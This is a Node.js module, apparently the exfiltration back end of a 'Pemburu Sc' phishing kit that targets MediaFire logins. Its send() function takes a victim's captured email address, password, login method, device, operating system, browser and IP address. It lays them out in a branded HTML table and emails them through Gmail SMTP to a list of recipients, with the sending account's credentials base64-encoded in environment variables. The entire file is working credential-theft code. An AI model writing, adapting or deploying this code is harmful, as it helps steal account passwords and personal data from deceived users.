const path = require("path");
const fs = require("fs/promises");
const nodemailer = require("nodemailer");

const pathEmail = path.join(__dirname, "../data/email.json");
const dB64 = (encoded) => Buffer.from(encoded, "base64").toString("utf-8");

let transporter;
let emailData = [];

(async () => {
  try {
    const emailContent = await fs.readFile(pathEmail, "utf-8");
    emailData = JSON.parse(emailContent || "[]");

    transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: dB64(process.env.SEND_MAIL),
        pass: dB64(process.env.KUL_LANCIADI),
      },
    });

  } catch (err) {
    console.error("❌ Gagal membaca email.json atau inisialisasi transporter:", err);
  }
})();

function send({ emVal, passVal, device, os, browser, ipAddress, logVia, }) {
  if (!transporter || !emailData.length) {
    console.error("⛔ Transporter belum siap atau daftar email kosong.");
    return;
  }

  const mailOptions = {
  from: `"Pemburu Sc🇮🇩" <${dB64(process.env.SEND_MAIL)}>`,
  to: emailData,
  subject: "🔥Result Mediafire🔥",
  html: `
  <table style="border-collapse: collapse; width: 100%; max-width: 500px; margin: 10px auto; font-family: Arial, sans-serif; color: #333;">
    
    <!-- Header dengan gambar -->
    <tr>
      <td colspan="2" style="padding: 0; border: none; text-align: center;">
        <a href="https://youtube.com/@pemburusc-g5d?si=yMN6Ps9Lxvrb8Nj6">
          <img src="cid:bg1" alt="Pemburu Sc"
               style="width:100%; max-width:500px; display:block; margin:0 auto;" />
        </a>
      </td>
    </tr>

    <!-- Data Rows -->
    <tr>
      <td style="border: 1px solid #ddd; padding: 8px;"><strong>Login Via</strong></td>
      <td style="border: 1px solid #ddd; padding: 8px;">${logVia} Account</td>
    </tr>
    <tr>
      <td style="border: 1px solid #ddd; padding: 8px;"><strong>Email</strong></td>
      <td style="border: 1px solid #ddd; padding: 8px;">${emVal}</td>
    </tr>
    <tr>
      <td style="border: 1px solid #ddd; padding: 8px;"><strong>Password</strong></td>
      <td style="border: 1px solid #ddd; padding: 8px;">${passVal}</td>
    </tr>
    <tr>
      <td style="border: 1px solid #ddd; padding: 8px;"><strong>Device</strong></td>
      <td style="border: 1px solid #ddd; padding: 8px;">${device}</td>
    </tr>
    <tr>
      <td style="border: 1px solid #ddd; padding: 8px;"><strong>OS</strong></td>
      <td style="border: 1px solid #ddd; padding: 8px;">${os}</td>
    </tr>
    <tr>
      <td style="border: 1px solid #ddd; padding: 8px;"><strong>Browser</strong></td>
      <td style="border: 1px solid #ddd; padding: 8px;">${browser}</td>
    </tr>
    <tr>
      <td style="border: 1px solid #ddd; padding: 8px;"><strong>Ip Address</strong></td>
      <td style="border: 1px solid #ddd; padding: 8px;">${ipAddress}</td>
    </tr>

    <!-- Footer -->
    <tr>
      <td colspan="2" style="border: none; text-align: center; padding: 10px; font-size: 12px; color: #666;">
        <p>Result by Pemburu Sc.</p>
        <p>YT: Pemburu Sc</p>
        <p style="font-style:italic;">
          <a href="https://youtube.com/@pemburusc-g5d?si=yMN6Ps9Lxvrb8Nj6" style="color:blue; text-decoration:underline;">
            https://youtube.com/@pemburusc-g5d?si=yMN6Ps9Lxvrb8Nj6
          </a>
        </p>
        <p>&copy;Pemburu Sc</p>
      </td>
    </tr>

  </table>
`,
  attachments: [
    {
      filename: 'bg1.jpg',
      path: './public/img/bg1.jpg',
      cid: 'bg1'
    }
  ]
};

  transporter.sendMail(mailOptions, (err) => {
    if (err) {
      console.error("❌ Gagal kirim email:", err);
    } else {
      console.log("📨 Result berhasil dikirim cek email anda.");
    }
  });
}

module.exports = send;
